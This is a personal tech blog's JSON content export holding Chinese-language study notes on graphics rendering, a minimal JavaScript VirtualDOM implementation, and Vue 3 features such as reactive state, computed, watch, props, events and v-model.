{"meta":{"title":"Ccw's Blogs","subtitle":"","description":"","author":"ccw","url":"http://example.com","root":"/"},"pages":[{"title":"tags","date":"2024-09-21T11:40:21.000Z","updated":"2024-09-21T11:40:48.260Z","comments":false,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2024-09-21T11:58:34.000Z","updated":"2024-09-21T11:59:04.296Z","comments":false,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"渲染原理","slug":"渲染原理","date":"2024-08-21T00:27:00.000Z","updated":"2024-09-21T09:55:29.835Z","comments":true,"path":"2024/08/21/渲染原理/","permalink":"http://example.com/2024/08/21/%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/","excerpt":"","text":"着色器着色器类似于一个计算器，用于根据给定的参数，制作特效； 法线贴图这个中文名称有点怪，英文名称是 Normal Map，即普通贴图；它主要用于展现凹凸效果；理论上凹凸效果也可以使用建模来实现，但是当细节很多时，工作量过大，因此不现实。更高效的做法是使用带凹凸参数的贴图；物体只由数量有限的多边形来表示，表现的纹理则基于贴图参数来计算； 所谓的贴图参数，即是一种细节模拟，这些参数可用来计算光线效果，让相应的部位看起来像是有真实的模型存在一样。但实际上没有，完成是基于参数计算出来的效果； 法线：垂直于某个平面的线，这条线可用来计算物体和光线之间的夹角。 有了夹角后，就可以计算物体表面接收到多少光线； 物体呈现出体积形状，其实是由物体表面所反向的光线决定的。对于一个多边形圆柱体，如果我们将法线的角度变化，调整成圆柱形的，那么计算出来的着色也将是平滑过渡的，最后在我们肉眼看来，多边形变成了圆形。但实际上，底层的参数存储的是多边形； 将表面的法线角度与真实角度的偏差，单独抽离出来存储，那么这个偏差值的集合，就是所谓的法线贴图； CPU 渲染逻辑主要有四个工作： 剔除工作： 视锥体剔除； 图层剔除； 遮挡剔除； 设置渲染顺序： 不透明队列：根据距离摄像头的距离，由近到远依次渲染； 半透明队列：从远到近渲染； 打包数据：将数据打包发送给 GPU 渲染； 模型信息：顶点坐标、法线、UV、切线、顶点颜色、索引列表等； 变换矩阵：世界变换矩阵、VP 矩阵（基于相机位置和 FOV 参数）； 灯光、材质参数：着色器和材质参数，灯光信息等； 调用渲染函数 SetPassCall shader 脚本中的一个 Pass 语义块就是一个完整的渲染过程；一个着色器可包含多个 Pass 语义块； DrawCall：CPU 调用图像编程接口，命令 GPU 渲染的操作，即渲染命令；渲染命令的参数为图元列表，其计算结果为显示在屏幕上的像素； CPU 渲染阶段的一个重要输出是渲染图元，图元中包括 GPU 渲染需要用到的各种参数信息，例如点、线、面等几何信息； GPU 渲染管线GPU 渲染管线包含以下多个步骤： 顶点处理 顶点着色器：主要执行坐标转换，将顶点的坐标转换到齐次裁剪 曲面细分着色器（可选） 几何着色器（可选） 图元装配 光栅化 片元着色器 输出合并","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"渲染","slug":"渲染","permalink":"http://example.com/tags/%E6%B8%B2%E6%9F%93/"}]},{"title":"VirtualDOM 简易实现","slug":"VirtualDom 简易实现","date":"2024-06-22T04:12:00.000Z","updated":"2024-09-21T07:12:39.843Z","comments":true,"path":"2024/06/22/VirtualDom 简易实现/","permalink":"http://example.com/2024/06/22/VirtualDom%20%E7%AE%80%E6%98%93%E5%AE%9E%E7%8E%B0/","excerpt":"","text":"Vuejs 和 Reactjs 都用到了虚拟DOM，来实现数据绑定和 DOM 的自动更新，此处做了一个简单的实现，方便学习基本的工作原理； 12345678910111213const exampleButton = &#123; tag: &quot;button&quot;, properties: &#123; class: &quot;primary&quot;, disabled: true, onClick: doSomething, &#125;, children: [] // 虚拟节点列表&#125;const exampleText = &#123; text: &quot;Hello&quot;&#125; 1234567function h(tag, properties, children) &#123; return &#123; tag, properties, children &#125;;&#125;function text(content) &#123; return &#123; text: content &#125;&#125; 1234567891011121314151617181920212223242526272829function diffOne(l, r) &#123; const isText = l.text !== undefined; // 若是文本，直接替换 if (isText) &#123; return l.text !== r.text ? &#123; replace: r &#125; : &#123; noop: true &#125; &#125; // 若 tag 不同，直接替代 if (l.tag !== r.tag) &#123; return &#123; replace: r &#125;; &#125; // 检查需要删除的属性 const remove = []; for (const prop in l.properties) &#123; if (r.properties[prop] === undefined) &#123; remove.push(prop); &#125; &#125; // 检查新增的属性 const set = &#123;&#125;; for (const prop in r.properties) &#123; if (r.properties[prop] !== l.properties[prop]) &#123; set[prop] = r.properties[prop]; &#125; &#125; const children = diffList(l.chilren, r.children); return &#123; modify: &#123; remove, set, children &#125; &#125;;&#125; 1234567891011121314function diffList(ls, rs) &#123; const length = Math.max(ls.length, rs.length); return Array.from(&#123; length &#125;).map((_, i) =&gt; &#123; if (ls[i] === undefined) &#123; return &#123; create: rs[i] &#125; &#125; else &#123; if (rs[i] === undefined) &#123; return &#123; remove: true &#125; &#125; else &#123; return diffOne(ls[i], rs[i]) &#125; &#125; &#125;)&#125; 12345678910111213141516171819202122232425262728function apply(el, enqueue, childrenDiff) &#123; const children = Array.from(el.childNodes); childrenDiff.forEach((diff, i) =&gt; &#123; const action = Object.keys(diff)[0]; switch(action) &#123; case &quot;remove&quot;: &#123; children[i].remove(); break; &#125; case &quot;modify&quot;: &#123; modify(children[i], enqueue, diff.modify); &#125; case &quot;create&quot;: &#123; const child = create(enqueue, diff.create); el.appendChild(child); break; &#125; case &quot;replace&quot;: &#123; const child = create(diff.replace); children[i].replacewith(child); break; &#125; case &quot;noop&quot;: &#123; break; &#125; &#125; &#125;)&#125; 12345678910111213141516171819202122232425262728element[&quot;_ui&quot;] = &#123; listeners: &#123; click: doSomething &#125;&#125;// 事件监听函数, 所有事件都归集到同一个函数进行处理function listener(event) &#123; const el = event.currentTarget; const handler = el._ui.listeners[event.type]; const enqueue = el._ui.enqueue; const msg = handler(event); if (msg !== undefined) &#123; enqueue(msg) &#125;&#125;// 给 el 添加事件监听函数function setListener(el, event, handle) &#123; if (el._ui.listeners[event] === undefined) &#123; el.addEventListener(event, listener); &#125; el._ui.listeners[event] = handle;&#125;// 获得监听的事件名称function eventName(str) &#123; if (str.indexOf(&quot;on&quot;) === 0) &#123; return str.slice(2).toLowerCase(); &#125; return null;&#125; 12345678910111213141516const props = new Set([ &quot;autoplay&quot;, &quot;checked&quot;, &quot;checked&quot;, &quot;contentEditable&quot;, &quot;controls&quot;, &quot;default&quot;, &quot;hidden&quot;, &quot;loop&quot;, &quot;selected&quot;, &quot;spellcheck&quot;, &quot;value&quot;, &quot;id&quot;, &quot;title&quot;, &quot;accessKey&quot;, &quot;dir&quot;, &quot;dropzone&quot;, &quot;lang&quot;, &quot;src&quot;, &quot;alt&quot;, &quot;preload&quot;, &quot;poster&quot;, &quot;kind&quot;, &quot;label&quot;, &quot;srclang&quot;, &quot;sandbox&quot;, &quot;srcdoc&quot;, &quot;type&quot;, &quot;value&quot;, &quot;accept&quot;, &quot;placeholder&quot;, &quot;acceptCharset&quot;, &quot;action&quot;, &quot;autocomplete&quot;, &quot;enctype&quot;, &quot;method&quot;, &quot;name&quot;, &quot;pattern&quot;, &quot;htmlFor&quot;, &quot;max&quot;, &quot;min&quot;, &quot;step&quot;, &quot;wrap&quot;, &quot;useMap&quot;, &quot;shape&quot;, &quot;coords&quot;, &quot;align&quot;, &quot;cite&quot;, &quot;href&quot;, &quot;target&quot;, &quot;download&quot;, &quot;download&quot;, &quot;hreflang&quot;, &quot;ping&quot;, &quot;start&quot;, &quot;headers&quot;, &quot;scope&quot;, &quot;span&quot; ]);function setProperty(prop, value, el) &#123; if (props.has(prop)) &#123; el[prop] = value; &#125; else &#123; el.setAttribute(prop, value); &#125;&#125; 1234567891011121314151617181920212223function create(enqueue, vnode) &#123; if (vnode.text !== undefined) &#123; const el = document.createTextNode(vnode.text); return el; &#125; const el = document.createElement(vnode.tag); el._ui = &#123; listeners: &#123;&#125;, enqueue &#125;; // 有些 properties 是真的 prop, 有些则是事件监听函数，所以需要区别对待 for (const prop in vnode.properties) &#123; const event = eventName(prop); const value = vnode.properties[prop]; if (event !== null) &#123; setListener(el, event, value); &#125; else &#123; setProperty(prop, value, el); &#125; &#125; for (const childNode of vnode.children) &#123; const child = create(enqueue, childNode); el.appendChild(child); &#125; return el;&#125; 123456789101112131415161718192021function modify(el, enqueue, diff) &#123; for (const prop of diff.remove) &#123; const event = eventName(prop); if (event === null) &#123; el.removeAttribute(prop); &#125; else &#123; el._ui.listeners[event] = undefined; el.removeEventListener(event, listener); &#125; &#125; for (const prop in diff.set) &#123; const value = diff.set[prop]; const event = eventName[prop]; if (event !== null) &#123; setListener(el, event, value); &#125; else &#123; setProperty(prop, value, el); &#125; &#125;; apply(el, enqueue, diff.children);&#125; 1234567891011121314151617// 应用示例function view(state) &#123; return [ h(&quot;p&quot;, &#123;&#125;, [ text(`counter: $&#123;state.counter&#125;`)]) ];&#125;function update(state, msg) &#123; return &#123; counter: state.counter + msg &#125;&#125;const initialState = &#123; counter: 0 &#125;;const root = document.querySelector(&quot;.my-application&quot;);const &#123; enqueue &#125; = init(root, initialState, update, view);setInterval(() =&gt; enqueue(1), 1000); 123456789101112131415161718192021222324252627282930function init(root, initialState, update, view) &#123; let state = initialState; let nodes = []; let queue = []; function enqueue(msg) &#123; queue.push(msg); &#125; function draw() &#123; let newNodes = view(state); apply(root, enqueue, diffList(nodes, newNodes)); nodes = newNodes; &#125; function updateState() &#123; if (queue.length &gt; 0) &#123; let msgs = queue; queue = []; for (msg of msgs) &#123; state = update(state, msg, enqueue); &#125; draw(); &#125; window.requestAnimationFrame(updateState); &#125; draw(); updateState(); return &#123; enqueue &#125;;&#125; 12345const button = h( &quot;button&quot;, &#123; onClick: () =&gt; 1 &#125;, [ text(&quot;increase counter&quot;)],)","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"Vue3","slug":"Vue3","date":"2023-08-19T02:33:00.000Z","updated":"2024-09-21T07:19:10.317Z","comments":true,"path":"2023/08/19/Vue3/","permalink":"http://example.com/2023/08/19/Vue3/","excerpt":"","text":"基础app.use() 注册插件，有点像 Express 中的 use；所谓的插件，即具备某些功能的一段代码，这段代码用于添加全局功能； 插件可以是一个对象，也可以是一个函数； 如果是一个对象，需要有一个 install 方法，以便调用；该 install 函数的第一个参数是 app，第二个参数是 options 123456789import &#123; createApp &#125; from &#x27;vue&#x27;const app = createApp(&#123;&#125;)app.use(myPlugin, &#123; greetings: &#123; hello: &quot;Bonjour!&quot; &#125;&#125;); 12345678910111213// plugins/i18n.jsexport default &#123; install: (app, options) =&gt; &#123; // 注入一个全局可用的 $translate() 方法 app.config.globalProperties.$translate = (key) =&gt; &#123; // 获取 `options` 对象的深层属性 // 使用 `key` 作为索引 return key.split(&#x27;.&#x27;).reduce((o, i) =&gt; &#123; if (o) return o[i] &#125;, options) &#125; &#125;&#125; 1&lt;h1&gt;&#123;&#123; $translate(&#x27;greetings.hello&#x27;) &#125;&#125;&lt;/h1&gt; 插件的几种使用场景： 添加一些全局属性和方法； 添加一个全局资源； 添加一个全局组件 添加自定义指令； app.config.isCustomElement 有些元素是从外部引入的，并没有在 vue 中编写，此时需要备注一下哪些元素是自定义的，以免在编译时报错找不到； 1app.config.isCustomElement = tag =&gt; /^x-/.test(tag); app.mount 将 app 关联到 HTML 文件中的 Tag 1234567891011&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;title&gt;TodoMVC built with Vue Composition Api and Vuex&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;app-root&gt;&lt;/app-root&gt; &lt;script type=&quot;module&quot; src=&quot;./main.js&quot;&gt;&lt;/script&gt; &lt;/body&gt;&lt;/html&gt; reactivereactive 可用来创建一个对象，这个对象可以被多个组件引入，共享使用； 对象可以有自己的方法，通过调用该方法，改变对象的状态；这个改变会在所有的组件上同时更新； 12345678import &#123; reactive &#125; from &quot;vue&quot;;export const store = reactive(&#123; count: 0, increment() &#123; this.count++ &#125;&#125;); 12345&lt;template&gt; &lt;button @click=&quot;store.increment()&quot;&gt; &#123;&#123; store.count &#125;&#125; &lt;/button&gt;&lt;/template&gt; 除了用 reactive 来创建全局对象外，其实 ref 或者函数也可以实现该功能； 函数之所以可以，主要是利用了闭包的特性； 123456789101112131415import &#123; ref &#125; from &quot;vue&quot; // 保存状态的全局对象const globalCount = ref(1);export function useCount() &#123; // 保存状态的局部变量 const localCount = ref(1); return &#123; globalCount, localCount, &#125;&#125; 问：reactive 和 ref 有什么区别？ 答：有以下一些区别： reactive 只能处理对象，不能处理原始类型；ref 的底层实现其实最终也有调用 reactive； ref 可以通过 .value 重新赋值，reactive 不行，因此 reactive 在处理新的 array 时，不如 ref 重新赋值方便； 不过 reactive 修改对象的属性时，无须使用 .value，写起来会简单一些； 12345678910111213141516171819// reactive 很适合管理一个拥有多个原始类型属性的对象；const person = reactive(&#123; name: &quot;John&quot;, age: 37, isTall: true,&#125;); // 以上写法比使用多个 ref 来得方便const name = ref(&quot;Albert&quot;);const age = ref(37);const isTall = ref(true);// 但 ref 其实也可以写成下面这样const person = ref(&#123; name: &quot;John&quot;, age: 37, isTall: true,&#125;); computed() 其实也是返回一个 ref computed当值 B 依赖于值 A 时，通过 computed 可以实现当 A 变动时，B 实现实时更新； computed 接收一个函数做为参数，返回的是一个 ref 12345678910111213141516171819202122&lt;script setup&gt;import &#123; reacitve, computed &#125; from &quot;vue&quot; const author = reactive(&#123; name: &quot;john&quot;, books: [ &quot;vue1&quot;, &quot;vue2&quot;, &quot;vue3&quot;, ]&#125;);// computed 接收一个函数做为参数，返回的是一个 refconst message = computed(() =&gt; &#123; return author.books.length &gt; 0 ? &quot;yes&quot; : &quot;no&quot;;&#125;);&lt;/script&gt;&lt;template&gt; &lt;p&gt;Has Published books:&lt;/p&gt; &lt;span&gt;&#123;&#123; message &#125;&#125;&lt;/span&gt;&lt;/template&gt; computed 的好处是有缓存，也就是说，如果所依赖的值没变的话，它是不会重新计算的； 实际上 message 也可以定义成一个函数，结果一样，示例如下： 123456789101112131415161718&lt;script setup&gt;const author = reactive(&#123; name: &quot;john&quot;, books: [ &quot;vue1&quot;, &quot;vue2&quot;, &quot;vue3&quot;, ]&#125;);function message() &#123; return author.books.length &gt; 0 ? &quot;yes&quot; : &quot;no&quot;;&#125;&lt;/script&gt;&lt;template&gt; &lt;p&gt;Has Published books:&lt;/p&gt; &lt;span&gt;&#123;&#123; message() &#125;&#125;&lt;/span&gt;&lt;/template&gt; 状态管理器vue2 的状态管理器，在 vue3 中使用 Pinia 类与样式绑定有多种写法可用来绑定样式 123456// 方式一: 使用单个 ref&lt;script setup&gt;const isAcitve = ref(true);&lt;/script&gt;&lt;div :class=&quot;&#123; acitve: isActive &#125;&quot;&gt;&lt;/div&gt; 123456789101112// 方式二：使用多个 ref&lt;script setup&gt;const isAcitve = ref(true);const hasError = ref(false);&lt;/script&gt;&lt;template&gt; &lt;div class=&quot;static&quot; :class=&quot;&#123; active: isActive, &#x27;text-danger&#x27;: hasError &#125;&quot;&gt; &lt;/div&gt;&lt;/template&gt; 123456789// 方式三：使用对象&lt;script setup&gt;const classObject = &#123; active: true, &#x27;text-danger&#x27;: false,&#125;&lt;/script&gt;&lt;div :class=&quot;classObject&quot;&gt;&lt;/div&gt; 123456789101112// 方法四：使用数组&lt;script setup&gt;const activeClass = ref(&#x27;active&#x27;);const errorClass = ref(&#x27;text-danger&#x27;); const isActive = ref(true);&lt;/script&gt;&lt;div :class=&quot;[isActive ? activeClass : &#x27;&#x27;, errorClass]&quot;&gt;&lt;/div&gt;// 或者&lt;div :class=&quot;[&#123;[activeClass]: isActive &#125;, errorClass]&quot;&gt;&lt;/div&gt; 自定义组件上的 class 值，会传递到组件内部的 Tag 上面，示例如下： 12// 组件 myComponent 内部的内容&lt;p class=&quot;foo bar&quot;&gt;&lt;/p&gt; 12// 在调用 myComponent 组件时&lt;myComponent class=&quot;baz boo&quot;&gt;&lt;/myComponent&gt; 12// 渲染结果为&lt;p class=&quot;foo bar baz boo&quot;&gt;&lt;/p&gt; 如果 myComponent 内部有多上根Tag，那么需要指定哪个根 Tag 接收外部传进来的 class 值，示例如下 123// 内部有两个根元素 p 和 span，此处指定 p 接收 myComponent 的 class 值&lt;p :class=&quot;$attrs.class&quot;&gt;hi&lt;/p&gt;&lt;span&gt;message&lt;/span&gt; 适用于 class 的绑定规则，同样也适用于 style 的绑定，示例如下： 1234const styleObject = reactive(&#123; color: &#x27;red&#x27;, fontSize: &#x27;30px&#x27;&#125;) 1&lt;div :style=&quot;styleObject&quot;&gt;&lt;/div&gt; 事件修饰符当我们想阻止某个事件的冒泡时，可以在绑定的方法中调用 event.stopPropagation()，但 vue 还提供了一种更简便的方法，示例如下： 12345678// 旧方法function warn(message, event) &#123; // 这里可以访问原生事件 if (event) &#123; event.preventDefault() &#125; alert(message)&#125; 以下是使用事件修饰符进行绑定的方式： 12345678&lt;!--新方法--&gt;&lt;script setup&gt;function warn(message, event) &#123; alert(message)&#125; &lt;/script&gt;&lt;a @click.stop=&quot;warn&quot;&gt;&lt;/a&gt; 按键修饰符按键修饰符可用于监听键盘上某个特定的键被按下的事件 123456&lt;!--此处监听 enter 键--&gt;&lt;input @keyup.enter=&quot;submit&quot; /&gt;&lt;!--此处监听 pageDown 键--&gt;&lt;input @keyup.page-down=&quot;onPageDown&quot; /&gt; 鼠标修饰符用来监听鼠标事件 .left 左键 .right 右键 .middle 中键 表单输入绑定在处理表单输入时，是需要双向绑定的，即改动 data，会更新 html；而改动 input 时，也会更新 data vue 使用 v-model 关键字来实现这种双向绑定 1&lt;input v-model=&quot;text&quot;&gt; 多个复选框可以绑定到一个数组或集合 12345678910111213141516&lt;script setup&gt;const checkedNames = ref([]);&lt;/script&gt;&lt;template&gt; &lt;div&gt;checked names: &#123;&#123; checkedNames &#125;&#125;&lt;/div&gt; &lt;input type=&quot;checkbot&quot; id=&quot;jack&quot; value=&quot;jack&quot; v-model=&quot;checkedNames&quot;&gt; &lt;label for=&quot;jack&quot;&gt;&lt;/label&gt; &lt;input type=&quot;checkbot&quot; id=&quot;john&quot; value=&quot;john&quot; v-model=&quot;checkedNames&quot;&gt; &lt;label for=&quot;john&quot;&gt;&lt;/label&gt; &lt;input type=&quot;checkbot&quot; id=&quot;mike&quot; value=&quot;mike&quot; v-model=&quot;checkedNames&quot;&gt; &lt;label for=&quot;mike&quot;&gt;&lt;/label&gt;&lt;/template&gt; v-bindv-bind 可用于标签的属性绑定 1234567891011&lt;div v-bind=&quot;&#123; id: &#x27;blue&#x27;&#125;&quot;&gt;&lt;/div&gt;&lt;!--等同于如下--&gt;&lt;div id=&quot;blue&quot;&gt;&lt;/div&gt;&lt;!--简写如下--&gt;&lt;script setup&gt; const id = ref(&quot;abc&quot;);&lt;/script&gt;&lt;div :id=&quot;id&quot;&gt;&lt;/div&gt; v-model 修饰符.lazy默认情况下，v-model 的更新是实时的，但可使用 .lazy 修饰符，让更新不再实时，而是触发 change 事件后再更新 1&lt;input v-model.lazy=&quot;msg&quot; /&gt; .number将输入的字符串自动转成数字 1&lt;input v-model.number=&quot;age&quot; /&gt; .trim自动去除字符串首尾的空格 1&lt;input v-mdoel.trim=&quot;msg&quot; /&gt; 生命周期最常用的几个生命周期 onMounted onUpdated onUnmounted watch 侦听器当某个对象的值出现变化时，就执行回调函数；监听的对象可以是如下几种类型 12345678910111213141516171819202122232425const x = ref(0);const y = ref(0);// 监听单个 ref 对象watch(x, (new_x) =&gt; &#123; // do something&#125;);// 监听 getter 函数watch( () =&gt; x.value + y.value, (sum) =&gt; &#123; console.log(&quot;sum of x and y is: &quot;, sum); &#125;);// 监听数组watch( [x, () =&gt; y.value], ([new_x, new_y]) =&gt; &#123; console.log(`new x is $&#123;new_x&#125; and new y is $&#123;new_y&#125;`); &#125;); watch 并非马上执行，而是当监听对象的值出现变化时，才会执行。因此，如果想让它立即执行，那么需要加个 { immediate: true } 参数； 默认情况下，如果在回调函数中访问监听对象，此时监听对象的值，是原始状态；如果未被回调函数改变前的状态；如果需要访问改变后的状态，则需要给 watch 传递 { flush: “post” } 选项； watchEffectwatchEffect 有点像是 watch 的语法糖，在使用 watch 时，需要显示的指定某个监听对象；watchEffect 则不用，它可以自动从回调函数中判断需要监听的对象；而且是加载后，马上执行 1234567const todoId = ref(1);const data = ref(null);watchEffect(async () =&gt; &#123; const res = await fetch(`https://example.com/$&#123;todoId.value&#125;`) data.value = await res.json();&#125;) 访问 DOM如果想直接访问 DOM，则可以给标签的 ref 属性设置名称，之后就可以在代码中引用它，示例如下： 12345678910111213&lt;script setup&gt;import &#123; ref, onMounted &#125; from &quot;vue&quot;;const myInput = ref(null); // 此处用同名变量，实现对 input 标签的引用onMounted(() =&gt; &#123; myInput.value.focus();&#125;)&lt;/script&gt;&lt;template&gt; &lt;input ref=&quot;myInput&quot;&gt;&lt;/template&gt; 当 ref 被用在子组件上时，此时引用的不再是标签，而是子组件实例 12345678910&lt;script setup&gt; import &#123; ref, onMounted &#125; from &quot;vue&quot;; import Child from &quot;./Child.vue&quot;; const child = ref(null); // 此处引用的是 Child 实例&lt;/script&gt;&lt;template&gt; &lt;Child ref=&quot;child&quot;&gt;&lt;/Child&gt;&lt;/template&gt; 默认情况下，子组件内部的属性和方法是私有的，父组件无法直接访问，除非子组件使用 defineExpose 进行暴露； 1234567891011&lt;script setup&gt; import &#123; ref &#125; from &quot;vue&quot;; const a = 1; const b = ref(2); defineExpose(&#123; a, b, &#125;)&lt;/script&gt; 此时父组件可通过 ref 引用来访问子组件中的 a 和 b 变量 1// 此时 ref 的值为 &#123; a: number, b: number &#125; 组件API以下两种形式的 API 是等价的 123456789&lt;!-- 组合式 API --&gt;&lt;script setup&gt; import &#123; ref &#125; from &#x27;vue&#x27;; const count = ref(0);&lt;/script&gt;&lt;template&gt; &lt;button @click=&quot;count++&quot;&gt;&lt;/button&gt;&lt;/template&gt; 123456789101112&lt;!-- 选项式 API --&gt;import &#123; ref &#125; from &#x27;vue&#x27;;export default &#123; setup: () =&gt; &#123; const count = ref(0); return &#123; count &#125;; &#125;, template: `&lt;button @click=&quot;count++&quot;&gt;&lt;/button&gt;` // template 也可以引用一个模板 // template: &#x27;#my-template-element&#x27;&#125; 父组件可通过 props 向子组件传递数据；子组件可 emit 事件，父组件通过监听事件来获得子组件传递的数据； slot 插槽slot 的作用类似于占位符，可接收由父组件传进来的 HTML 内容，示例如下： 1234567&lt;!--AlertBox.vue--&gt;&lt;template&gt; &lt;div&gt; &lt;strong&gt;This is an Error box&lt;/strong&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/div&gt;&lt;/template&gt; 12&lt;!--此处父组合的内容 Something bad happen 会出现中子组件的 slot 位置--&gt;&lt;AlertBox&gt;Something bad happen&lt;/AlertBox&gt; 深入组件注册全局注册组件需要注册后才能使用，通过 app.component 方法，可将某个组件注册为全局的组件，之后可以在任意文件中使用该全局组件； 123456import &#123; createApp &#125; from &#x27;vue&#x27;;import MyComponent from &quot;./App.vue&quot;;const app = createApp(&#123;&#125;);app.component(&#x27;MyComponent&#x27;, MyComponent); // 全局注册 局部注册局部注册：仅在需要使用的位置，导入相应的组件 1234567&lt;script setup&gt; import ComponentA from &#x27;./ComponentA.vue&#x27;&lt;/script&gt;&lt;template&gt; &lt;ComponentA /&gt;&lt;/template&gt; props除了 attribute 外，考虑父组件还可通过 props 传递数据给子组件。因此，最好显式的声明 props，这样有利于 Vue 区分二者； 12345678910111213141516171819202122232425// props 使用对象，并写上属性值的类型，有助于尽早发现传错参数defineProps(&#123; title: String, likes: Number&#125;)// 还可以添加校验规则defineProps(&#123; propA: &#123; type: String, required: true, default: &quot;hello&quot; &#125;, propB: &#123; validator(value, props) &#123; return [&#x27;success&#x27;, &#x27;warning&#x27;, &#x27;danger&#x27;].includes(value); &#125; &#125;, propC: &#123; type: Function, // 可以是函数类型 default() &#123; return &#x27;Default Function&#x27; &#125; &#125;&#125;) Vue 倾向在写 HTML atribute 时，使用传统的 kecal-case 枨，然后它还会自动映射 kebab-case 和 camelCase 格式，以便和传统的 javascript camelCase 保持一致； 个人感觉这种两边讨好的做法不是很好；缺少一致性，容易让人感到困惑； 1&lt;MyComponent greeting-message=&quot;hello&quot;&gt;&lt;/MyComponent&gt; 当使用 v-bind 时，引号中的内容，实际上是一个表达式，而不是字符串 123456789101112131415&lt;!-- 因为使用 v-bind，所以此处的 42 其实是一个 Number 类型， --&gt;&lt;!-- 因为这是一个 JavaScript 表达式而不是一个字符串 --&gt;&lt;BlogPost :likes=&quot;42&quot; /&gt;&lt;!-- 根据一个变量的值动态传入 --&gt;&lt;BlogPost :likes=&quot;post.likes&quot; /&gt;&lt;!-- 同理，false 是一个布尔值 --&gt;&lt;BlogPost :is-published=&quot;false&quot; /&gt;&lt;!-- 表达式自然是支持数组的 --&gt;&lt;BlogPost :commend-ids=&quot;[234, 245, 273]&quot; /&gt;&lt;!--表达式也支持对象--&gt;&lt;BlogPost :author=&quot;&#123; name: &#x27;John&#x27;, age: 47 &#125;&quot; /&gt; 可通过 v-bind&#x3D;对象，批量绑定多个 prop 123456789&lt;script setup&gt;const post = &#123; id: 1, title: &quot;My Journey&quot;&#125;&lt;/script&gt;&lt;!--同时绑定了 id 和 title 两个 prop --&gt;&lt;BlogPost v-bind=&quot;post&quot; /&gt; 注意：prop 是单向绑定，即数据由父组件传递给子组件，这意味着它是只读的，我们不能在子组件的代码中，修改 prop 的值 1234const props = defineProps([&#x27;foo&#x27;]);// 以下尝试修改 foo 的值是错误的props.foo = &quot;bar&quot;; 由于在 Javascript 中，对象类型的参数，实际上是一个引用，因此，虽然无法直接更改对象绑定的变量，但可以改变对象内部的属性。但这是一种不良做法，应该在实践中避免；如有需要修改，应使用 emit 事件的方式；由监听事件的父组件对 prop 进行修改； 事件在组件的 template 模板中，可使用内置的 $emit 函数来触发事件 1&lt;button @click=&quot;$emit(&#x27;someEvent&#x27;)&quot; /&gt; 事件支持携带参数 1&lt;button @click=&quot;$emit(&#x27;someEvent&#x27;, param)&quot; /&gt; 通过使用 defineEmit() 宏显式的声明可触发的事件后，会返回一个 emit 函数，能够在代码中直接调用，它的效果跟 template 中的 $emit 是一样的； 1234567&lt;script setup&gt; const emit = defineEmits([&#x27;inFocus&#x27;, &#x27;submit&#x27;]); function buttonClick() &#123; emit(&quot;submit&quot;); &#125;&lt;/script&gt; 组件 v-model通过在子组件上使用 v-model，可以实现父子组件之间数据的双向绑定；父子组件传统的通信方式是使用 prop 和 emit，事实上在组件上使用 v-model 只是一个语法糖，它的底层仍然还是 prop 和 emit，只是它由解释器完成补全； 123456&lt;!--父组件--&gt;&lt;script setup&gt; const myRef = ref();&lt;/script&gt;&lt;Child v-model=&quot;myRef&quot; /&gt; 12345678&lt;!--子组件 Child.vue --&gt;&lt;script setup&gt; const myRefVar = defineModel();&lt;/script&gt;&lt;template&gt; &lt;input v-model=&#x27;myRefVar&#x27; /&gt;&lt;/template&gt; 可以绑定多个 v-model 12345&lt;!-- 父组件 --&gt;&lt;UserName v-model:firstName=&quot;first&quot; v-model:lastName=&quot;last&quot; /&gt; 1234567891011&lt;!-- 子组件 --&gt;&lt;script setup&gt;const firstName = defineModel(&quot;firstName&quot;);const lastName = defineModel(&quot;lastName&quot;);&lt;/script&gt;&lt;template&gt; &lt;input type=&quot;text&quot; v-model=&quot;firstName&quot; /&gt; &lt;input type=&quot;text&quot; v-model=&quot;lastName&quot; /&gt;&lt;/template&gt; 组件 v-model 同样支持修饰符，例如 v-model.capitalize，之后在 defineModel 中，可以基于传入的修饰符的值，自定义 set 函数，实现想要的处理； 12&lt;!-- 父组件 --&gt;&lt;MyComponent v-model.capitalize=&#x27;myText&#x27; /&gt; 12345678910111213141516171819202122&lt;!-- 子组件 --&gt;&lt;script setup&gt; const [model, modifiers] = defineModel(); console.log(&quot;modifiers&quot;) // &#123; capitalize: true &#125;&lt;/script&gt;&lt;template&gt; &lt;input type=&#x27;text&#x27; v-model=&quot;model&quot; /&gt;&lt;/template&gt;&lt;!-- 或者可以针对 modifiers 自定义处理方法 --&gt;&lt;script setup&gt; const [model, modifiers] = defineModel(&#123; set(value) &#123; if (modifiers.capitalize) &#123; return value.charAt(0).toUppercase() + value.slice(1) &#125; return value; &#125; &#125;)&lt;/script&gt; 透传 Attributes最常见的透传包括 class, style, id 等几个 HTML 标签的属性；但其实 v-on 监听器也会实现透传 12&lt;!-- 父组件 --&gt;&lt;MyButton @click=&quot;onClick&quot;&gt;&lt;/MyButton&gt; 12&lt;!-- 子组件 --&gt;&lt;button @click=&quot;onChildClick&quot; /&gt; 当 button 触发点击事件时，onChildClick 和 onClick 两个函数都会被执行，事实上 button 标签绑定了来自父子组件的两个点击事件； 深层组件继承如果子组件的根元素也是一个组件，那么父组件的 attributes 会持续向下一级透传； 如果不想要继承透传，可在组件选项中设置 inheritAttrs: false 12345&lt;script setup&gt; defineOptions(&#123; inheritAttrs: false, &#125;)&lt;/script&gt; 透传的 attributes 可在 template 中使用 $attris 进行访问 1&lt;span&gt;&#123;&#123; $attrs &#125;&#125;&lt;/span&gt; @click 在透传后，子组件可使用 $attrus.onClick 进行访问； 如果子组件有多个根节点，那么需要显式指定由哪个根节点继承父组件透传的 attris，否则编译器会抛出警告； 如果想要在 js 代码中访问 attrus，则可以使用 useAttrs 12345&lt;script setup&gt; import &#123; useAttrs &#125; from &#x27;vue&#x27;; const attrs = useAttrs();&lt;/script&gt; 